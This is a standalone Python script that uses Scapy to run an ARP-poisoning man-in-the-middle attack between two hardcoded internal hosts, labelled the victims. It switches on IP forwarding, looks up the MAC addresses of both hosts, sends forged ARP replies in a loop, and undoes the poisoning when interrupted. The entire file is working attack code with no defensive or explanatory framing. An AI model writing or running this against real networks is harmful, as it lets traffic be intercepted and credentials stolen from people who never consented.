#!/usr/bin/python3
from scapy.all import *
from scapy.layers.l2 import *


try:
    interface = 'eth0'
    serverIP = '10.10.10.190'   # FIXME: Internal-Server IP
    clientIP = '10.10.10.192'   # FIXME: INternal-Client IP
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)

print("\n[*] Beginning IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def reARP():
    print("\n[*] Restoring Targets...")
    serverMAC = get_mac(serverIP)
    clientMAC = get_mac(clientIP)
    send(ARP(op=2, pdst=clientIP, psrc=serverIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=serverMAC), count=7)
    send(ARP(op=2, pdst=serverIP, psrc=clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=clientMAC), count=7)
    print("[*] Stopping IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)


def trick(clientMAC, serverMAC):
    send(ARP(op=2, pdst=serverIP, psrc=clientIP, hwdst=serverMAC))
    send(ARP(op=2, pdst=clientIP, psrc=serverIP, hwdst=clientMAC))


def mitm():
    try:
        serverMAC = get_mac(serverIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        clientMAC = get_mac(clientIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Victims...")
    while 1:
        try:
            trick(clientMAC, serverMAC)
            time.sleep(0.5)
        except KeyboardInterrupt:
            reARP()
            break

mitm()
